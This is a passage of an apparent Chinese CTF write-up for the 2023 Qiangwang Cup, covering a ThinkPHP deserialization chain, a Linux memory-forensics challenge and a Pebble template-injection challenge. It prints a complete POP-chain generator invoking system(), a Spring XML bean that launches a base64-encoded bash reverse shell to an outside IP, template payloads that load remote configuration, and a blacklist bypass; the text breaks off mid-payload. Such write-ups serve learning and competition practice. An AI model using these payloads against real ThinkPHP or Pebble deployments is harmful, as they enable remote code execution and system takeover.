class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">Pivot</span>;<br>    <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;display_errors&#x27;</span>,<span class="hljs-number">1</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files = [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>)];<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$aaa</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>(<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;ls&#x27;</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$aaa</span>)));<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">abstract</span> <span class="hljs-title class_">class</span> <span class="hljs-title class_">Model</span><br>    &#123;&#125;<br>&#125;<br><span class="hljs-title class_">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Model</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">console</span>\<span class="hljs-title">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$error</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$parent</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append[<span class="hljs-string">&#x27;jelly&#x27;</span>] = <span class="hljs-string">&#x27;getError&#x27;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;error = <span class="hljs-keyword">new</span> relation\<span class="hljs-title function_ invoke__">BelongsTo</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-built_in">parent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">relation</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>\<span class="hljs-title class_">Query</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">model</span>\<span class="hljs-title">Relation</span>;<br>    <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OneToOne</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Relation</span></span><br><span class="hljs-class">    </span>&#123;&#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BelongsTo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">OneToOne</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$selfRelation</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$query</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$bindAttr</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;selfRelation = <span class="hljs-literal">false</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;query = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Query</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>            <span class="hljs-variable language_">$this</span>-&gt;bindAttr = [<span class="hljs-string">&#x27;&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">db</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>\<span class="hljs-title class_">Output</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Query</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$model</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;model = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Output</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">console</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcache</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Output</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$styles</span> = [];<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$handle</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;styles = [<span class="hljs-string">&#x27;getAttr&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;handle = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcache</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">session</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>\<span class="hljs-title class_">Memcached</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcache</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$config</span>  = [<br>            <span class="hljs-string">&#x27;expire&#x27;</span>       =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>            <span class="hljs-string">&#x27;session_name&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>        ];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Memcached</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">cache</span>\<span class="hljs-title class_">driver</span>&#123;<br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">Request</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Memcached</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$handler</span>;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$options</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$tag</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-comment">// pop链中需要prefix存在，否则报错</span><br>            <span class="hljs-variable language_">$this</span>-&gt;options = [<span class="hljs-string">&#x27;prefix&#x27;</span>   =&gt; <span class="hljs-string">&#x27;jelly/&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;tag = <span class="hljs-literal">true</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;handler = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Request</span>(<span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Request</span><br>    &#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">get</span>     = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filter</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>,<span class="hljs-variable">$parameter</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;filter = <span class="hljs-variable">$function</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;get = [<span class="hljs-string">&quot;jelly&quot;</span>=&gt;<span class="hljs-variable">$parameter</span>];<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure><img src="/img/2023第七届强网杯/170482122317312.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/170482122317313.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h1 id="强网先锋">强网先锋</h1><h2 id="找到png了吗">找到PNG了吗</h2><p>vol打不开，010打开文件头为<code>EMiL</code>，linux镜像，banner看对应操作系统</p><figure><img src="/img/2023第七届强网杯/170482122317314.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据Ubuntu版本制作对应的profile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Plain">root@ubuntu:/home/ddd/Desktop/volatility-master# python vol.py -f ../1.mem --profile=LinuxUbuntux64 linux_banner<br>Volatility Foundation Volatility Framework 2.6.1<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>Linux version 5.4.0-100-generic (buildd@lcy02-amd64-002) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 (Ubuntu 5.4.0-100.113-generic 5.4.166)<br></code></pre></td></tr></table></figure><p>lsof找到桌面上的文件have_your_fun.jocker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Plain">root@ubuntu:/home/ddd/Desktop/volatility-master# python vol.py -f ../1.mem --profile=LinuxUbuntux64 linux_lsof | grep &quot;Desktop&quot;<br>Volatility Foundation Volatility Framework 2.6.1<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>WARNING : volatility.debug    : Overlay structure cpuinfo_x86 not present in vtypes<br>0xffff9ce2af3cc680 bash                               2158        4 /home/yuren/Desktop/have_your_fun.jocker<br>0xffff9ce2bac09780 insmod                             2170        3 /home/yuren/Desktop/LiME/src/lime-5.4.0-100-generic.ko<br></code></pre></td></tr></table></figure><p>尝试导出，结果为空</p><p>在010中找<code>have_your_fun.jocker</code>，找到加密脚本</p><p>加密文件，两次rc4，两个密钥都给出</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;arpa/inet.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_IP <span class="hljs-string">&quot;192.168.6.1&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SERVER_PORT 110</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buff[<span class="hljs-number">20000</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">char</span>* a, <span class="hljs-type">char</span>* b)</span> </span>&#123;<br>    <span class="hljs-type">char</span> temp = *a;<br>    *a = *b;<br>    *b = temp;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rc4_encrypt_decrypt</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* key, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* data, <span class="hljs-type">int</span> data_length)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i, j = <span class="hljs-number">0</span>, t;<br>    <span class="hljs-type">int</span> s[<span class="hljs-number">256</span>];<br>    <span class="hljs-type">int</span> key_length = <span class="hljs-built_in">strlen</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)key);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        s[i] = i;<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>        j = (j + s[i] + key[i % key_length]) % <span class="hljs-number">256</span>;<br>        t = s[i];<br>        s[i] = s[j];<br>        s[j] = t;<br>    &#125;<br><br>    i = j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">0</span>; k &lt; data_length; k++) &#123;<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>        j = (j + s[i]) % <span class="hljs-number">256</span>;<br>        t = s[i];<br>        s[i] = s[j];<br>        s[j] = t;<br>        data[k] ^= s[(s[i] + s[j]) % <span class="hljs-number">256</span>];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> clientSocket = <span class="hljs-built_in">socket</span>(AF_INET, SOCK_STREAM, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (clientSocket == <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;socket failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">struct</span> <span class="hljs-title class_">sockaddr_in</span> serverAddr;<br>    serverAddr.sin_family = AF_INET;<br>    serverAddr.sin_port = <span class="hljs-built_in">htons</span>(SERVER_PORT);<br>    serverAddr.sin_addr.s_addr = <span class="hljs-built_in">inet_addr</span>(SERVER_IP);<br>    <span class="hljs-built_in">connect</span>(clientSocket, (<span class="hljs-keyword">struct</span> sockaddr*)&amp;serverAddr, <span class="hljs-built_in">sizeof</span>(serverAddr));<br>    <span class="hljs-type">int</span> result = <span class="hljs-built_in">recv</span>(clientSocket, buff, <span class="hljs-built_in">sizeof</span>(buff), <span class="hljs-number">0</span>);<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> q[<span class="hljs-number">10</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key[]=<span class="hljs-string">&quot;do_not_care&quot;</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> key2[] = <span class="hljs-string">&quot;where_is_the_key&quot;</span>;<br>    FILE* file = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;have_your_fun.jocker&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;open file failed!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *str;<br>    str = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">malloc</span>(<span class="hljs-number">20000</span>);<br>    <span class="hljs-built_in">memcpy</span>(str, buff, <span class="hljs-number">20000</span>);<br><span class="hljs-built_in">rc4_encrypt_decrypt</span>(key2, str, <span class="hljs-number">20000</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please give me the key of fun:&quot;</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>,q);<br>    <span class="hljs-built_in">rc4_encrypt_decrypt</span>(key, str, <span class="hljs-number">20000</span>);<br>    <br>    <span class="hljs-built_in">fwrite</span>(buff, <span class="hljs-number">1</span>, <span class="hljs-number">20000</span>, file);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;maybe you go wrong&quot;</span>);<br>    <span class="hljs-built_in">fclose</span>(file);<br>    <span class="hljs-built_in">close</span>(clientSocket);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>题目要png，用png头加密两次rc4，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">89504E47:e5afbeba<br></code></pre></td></tr></table></figure><p>根据文件头尾找到加密的png</p><figure><img src="/img/2023第七届强网杯/170482122317315.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>再两次rc4得到png</p><figure><img src="/img/2023第七届强网杯/170482122317316.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>得到flag</p><figure><img src="/img/2023第七届强网杯/170482122317317.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="hello-spring">hello spring</h2><p>题目给的jar包和远程不一样</p><p>然后根据配置文件和源码<code>return "home";</code>写一个<code>home.pebble</code>放在<code>/tmp</code>目录下，作为模板文件</p><figure><img src="/img/2023第七届强网杯/170482122317318.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/170482122317319.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>本地搭好环境之后是这样的</p><figure><img src="/img/2023第七届强网杯/170482122317320.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>pom.xml看到pebble组件版本为3.1.5</p><figure><img src="/img/2023第七届强网杯/170482122317321.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以搜索到https://github.com/Y4tacker/Web-Security/issues/3?cve=title</p><p>vps上写1.xml，弹shell</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMxLjE4NC80NTY3IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span></span><br><span class="language-xml">            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&#123;% set y= beans.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;</span>).<span class="hljs-property">resourceLoader</span>.<span class="hljs-property">classLoader</span>.<span class="hljs-title function_">loadClass</span>(<span class="hljs-string">&quot;java.beans.Beans&quot;</span>) %&#125;<br>&#123;% set yy =  beans.<span class="hljs-title function_">get</span>(<span class="hljs-string">&quot;jacksonObjectMapper&quot;</span>).<span class="hljs-title function_">readValue</span>(<span class="hljs-string">&quot;&#123;&#125;&quot;</span>, y) %&#125;<br>&#123;% set yyy = yy.<span class="hljs-title function_">instantiate</span>(<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;org.springframework.context.support.ClassPathXmlApplicationContext&quot;</span>) %&#125;<br>&#123;&#123; yyy.<span class="hljs-title function_">setConfigLocation</span>(<span class="hljs-string">&quot;http://vps:port/1.xml&quot;</span>) &#125;&#125;<br>&#123;&#123; yyy.<span class="hljs-title function_">refresh</span>() &#125;&#125;<br></code></pre></td></tr></table></figure><p>这里注意时间</p><figure><img src="/img/2023第七届强网杯/170482122317322.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023第七届强网杯/170482122317323.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>本地是加了8小时（实际上好像不用加）</p><figure><img src="/img/2023第七届强网杯/170482122317324.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>然后访问<code>?x=file_20231227_230625</code>弹shell</p><p>远程还有一个filter但是jar包里没给</p><figure><img src="/img/2023第七届强网杯/170482122317425.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>实际黑名单过滤了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">org.springframework.context.support.ClassPathXmlApplicationContext<br></code></pre></td></tr></table></figure><p>可以字符串拼接绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Plain">org.springframework.context.&quot;+&quot;support.ClassPathXmlApplicationContext<br></code></pre></td></tr></table></figure><p>或者用第二种方法</p><p>https://blog.arkark.dev/2022/08/01/uiuctf/</p><p>先传一个evil.pebble</p><p>需要修改一下Prefix和Suffix</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&#123;% set accessValidatorClass = beans.get(&quot;jacksonObjectMapper&quot;).getTypeFactory().findClass(&quot;com.mitchellbosecke.pebble.attributes.methodaccess.NoOpMethodAccessValidator&quot;) %&#125;<br>&#123;% set accessValidator =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, accessValidatorClass) %&#125;<br><br>&#123;% set builderClass = 